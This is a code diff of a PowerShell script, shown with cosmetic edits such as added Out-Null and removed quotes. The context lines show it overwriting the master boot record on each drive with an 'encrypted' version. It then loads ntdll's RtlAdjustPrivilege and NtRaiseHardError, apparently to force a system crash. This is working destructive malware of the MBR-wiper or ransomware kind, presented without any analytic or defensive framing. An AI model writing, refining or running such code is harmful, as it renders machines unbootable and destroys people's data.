@@ -30,7 +30,7 @@ foreach ($drive in $drives) {
         }
 
         # Write the modified MBR back to the disk
-        $fs.Seek(0, [IO.SeekOrigin]::Begin)
+        $fs.Seek(0, [IO.SeekOrigin]::Begin) | Out-Null
         $fs.Write($mbr, 0, 512)
 
         Write-Host "Successfully encrypted MBR on $($drive.DeviceID)"
@@ -55,8 +55,8 @@ function Add-PInvoke {
     $mb.SetImplementationFlags('PreserveSig')
 }
 
-Add-PInvoke -DllName "ntdll" -Name "RtlAdjustPrivilege" -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void])
-Add-PInvoke -DllName "ntdll" -Name "NtRaiseHardError" -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void])
+Add-PInvoke -DllName ntdll -Name RtlAdjustPrivilege -ParameterTypes @([Int32], [Boolean], [Boolean], ([Boolean]).MakeByRefType()) -ReturnType ([Void])
+Add-PInvoke -DllName ntdll -Name NtRaiseHardError -ParameterTypes @([UInt32], [UInt32], [UInt32], [IntPtr], [UInt32], ([UInt32]).MakeByRefType()) -ReturnType ([Void])
 
 $NM = $type.CreateType()
 $NM::RtlAdjustPrivilege(19, $true, $false, [ref]0)
